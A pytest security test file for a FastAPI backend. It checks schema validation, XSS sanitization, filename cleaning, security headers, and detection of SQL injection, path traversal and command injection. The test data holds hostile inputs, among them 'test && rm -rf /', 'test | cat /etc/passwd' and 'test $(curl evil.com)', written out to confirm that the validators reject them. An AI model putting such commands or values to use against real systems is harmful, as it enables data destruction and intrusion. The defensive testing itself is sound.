"""
Input Validation Security Tests
Author: Claude Code
Date: 2024-01-22
Description: Test input validation and sanitization
"""

import pytest
from fastapi.testclient import TestClient
from pydantic import ValidationError

from backend.common.schemas import SearchRequest, ChatRequest
from backend.common.utils import sanitize_text, strip_control_chars
from backend.security import (
    validate_sql_input,
    validate_path_traversal,
    validate_command_injection,
    sanitize_filename
)


class TestPydanticValidation:
    """Test Pydantic schema validation"""
    
    def test_valid_search_request(self):
        """Test valid search request"""
        request = SearchRequest(
            query="선각기술부 회의록",
            source="mail",
            limit=10
        )
        assert request.query == "선각기술부 회의록"
        assert request.limit == 10
    
    def test_sql_injection_blocked(self):
        """Test SQL injection prevention"""
        with pytest.raises(ValidationError) as exc_info:
            SearchRequest(
                query="'; DROP TABLE users; --",
                source="mail"
            )
        assert "Invalid characters" in str(exc_info.value)
    
    def test_query_length_limit(self):
        """Test query length validation"""
        with pytest.raises(ValidationError):
            SearchRequest(
                query="a" * 2001,  # Exceeds max_length=2000
                source="mail"
            )
    
    def test_empty_query_rejected(self):
        """Test empty query rejection"""
        with pytest.raises(ValidationError):
            SearchRequest(
                query="",
                source="mail"
            )
    
    def test_null_byte_removal(self):
        """Test null byte sanitization"""
        request = ChatRequest(
            question="test\x00question",
            source="mail"
        )
        assert "\x00" not in request.question
    
    def test_limit_bounds(self):
        """Test search limit boundaries"""
        # Valid limits
        request = SearchRequest(query="test", limit=1)
        assert request.limit == 1
        
        request = SearchRequest(query="test", limit=100)
        assert request.limit == 100
        
        # Invalid limits
        with pytest.raises(ValidationError):
            SearchRequest(query="test", limit=0)
        
        with pytest.raises(ValidationError):
            SearchRequest(query="test", limit=101)
    
    def test_threshold_validation(self):
        """Test similarity threshold validation"""
        # Valid thresholds
        request = SearchRequest(query="test", threshold=0.0)
        assert request.threshold == 0.0
        
        request = SearchRequest(query="test", threshold=1.0)
        assert request.threshold == 1.0
        
        # Invalid thresholds
        with pytest.raises(ValidationError):
            SearchRequest(query="test", threshold=-0.1)
        
        with pytest.raises(ValidationError):
            SearchRequest(query="test", threshold=1.1)


class TestTextSanitization:
    """Test text sanitization utilities"""
    
    def test_xss_script_removal(self):
        """Test XSS script tag removal"""
        text = "Hello <script>alert('XSS')</script> World"
        sanitized = sanitize_text(text)
        assert "<script>" not in sanitized
        assert "alert" not in sanitized
        assert "Hello" in sanitized
        assert "World" in sanitized
    
    def test_javascript_protocol_removal(self):
        """Test javascript: protocol removal"""
        text = '<a href="javascript:alert(1)">Click</a>'
        sanitized = sanitize_text(text)
        assert "javascript:" not in sanitized
    
    def test_event_handler_removal(self):
        """Test event handler removal"""
        text = '<div onclick="alert(1)">Test</div>'
        sanitized = sanitize_text(text)
        assert "onclick" not in sanitized
    
    def test_html_entity_escaping(self):
        """Test HTML entity escaping"""
        text = "<div>Test & 'quoted' \"text\"</div>"
        sanitized = sanitize_text(text)
        assert "&amp;" in sanitized
        assert "&lt;" in sanitized
        assert "&gt;" in sanitized
        assert "&quot;" in sanitized
        assert "&#x27;" in sanitized
    
    def test_control_char_removal(self):
        """Test control character removal"""
        text = "Hello\x00\x01\x02World\n"
        cleaned = strip_control_chars(text)
        assert "\x00" not in cleaned
        assert "\x01" not in cleaned
        assert "\x02" not in cleaned
        assert "\n" in cleaned  # Newline should be preserved
        assert "HelloWorld" in cleaned
    
    def test_max_length_enforcement(self):
        """Test maximum length enforcement"""
        text = "a" * 1000
        sanitized = sanitize_text(text, max_length=100)
        assert len(sanitized) == 100


class TestInjectionPrevention:
    """Test injection attack prevention"""
    
    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection"""
        # Malicious patterns
        assert not validate_sql_input("'; DROP TABLE users; --")
        assert not validate_sql_input("1' OR '1'='1")
        assert not validate_sql_input("admin'--")
        assert not validate_sql_input("1; DELETE FROM users")
        
        # Safe inputs
        assert validate_sql_input("normal search query")
        assert validate_sql_input("선각기술부 회의록")
        assert validate_sql_input("user@example.com")
    
    def test_path_traversal_detection(self):
        """Test path traversal detection"""
        # Malicious patterns
        assert not validate_path_traversal("../../etc/passwd")
        assert not validate_path_traversal("..\\..\\windows\\system32")
        assert not validate_path_traversal("%2e%2e/etc/passwd")
        assert not validate_path_traversal("/etc/passwd")
        assert not validate_path_traversal("C:\\Windows\\System32")
        
        # Safe paths
        assert validate_path_traversal("documents/file.pdf")
        assert validate_path_traversal("data.xlsx")
        assert validate_path_traversal("subfolder/document.docx")
    
    def test_command_injection_detection(self):
        """Test command injection detection"""
        # Malicious patterns
        assert not validate_command_injection("test; ls -la")
        assert not validate_command_injection("test | cat /etc/passwd")
        assert not validate_command_injection("test && rm -rf /")
        assert not validate_command_injection("test `whoami`")
        assert not validate_command_injection("test $(curl evil.com)")
        
        # Safe inputs
        assert validate_command_injection("normal text input")
        assert validate_command_injection("file-name.txt")
        assert validate_command_injection("search query 123")
    
    def test_filename_sanitization(self):
        """Test filename sanitization"""
        # Path traversal attempts
        assert ".." not in sanitize_filename("../../etc/passwd")
        assert "/" not in sanitize_filename("/etc/passwd")
        assert "\\" not in sanitize_filename("C:\\Windows\\System32")
        
        # Special characters
        sanitized = sanitize_filename("file<>:|?*.txt")
        assert "<" not in sanitized
        assert ">" not in sanitized
        assert ":" not in sanitized
        assert "|" not in sanitized
        assert "?" not in sanitized
        assert "*" not in sanitized
        
        # Length limit
        long_name = "a" * 300 + ".txt"
        sanitized = sanitize_filename(long_name)
        assert len(sanitized) <= 255
        assert sanitized.endswith(".txt")
        
        # Empty filename
        assert sanitize_filename("") == "unnamed"
        assert sanitize_filename(None) == "unnamed"


class TestSecurityHeaders:
    """Test security headers"""
    
    @pytest.fixture
    def client(self):
        """Create test client with security headers"""
        from backend.integration import create_integrated_app
        app = create_integrated_app(enable_security=True)
        return TestClient(app)
    
    def test_security_headers_present(self, client):
        """Test that security headers are present"""
        response = client.get("/health")
        
        # Check security headers
        assert response.headers.get("X-Content-Type-Options") == "nosniff"
        assert response.headers.get("X-Frame-Options") == "DENY"
        assert response.headers.get("X-XSS-Protection") == "1; mode=block"
        assert "Referrer-Policy" in response.headers
        assert "Content-Security-Policy" in response.headers
    
    def test_server_header_removed(self, client):
        """Test that server header is removed"""
        response = client.get("/health")
        assert "Server" not in response.headers or response.headers.get("Server") == ""
    
    def test_csp_policy(self, client):
        """Test Content Security Policy"""
        response = client.get("/health")
        csp = response.headers.get("Content-Security-Policy", "")
        
        # Check CSP directives
        assert "default-src" in csp
        assert "script-src" in csp
        assert "style-src" in csp
        assert "'self'" in csp


if __name__ == "__main__":
    pytest.main([__file__, "-v"])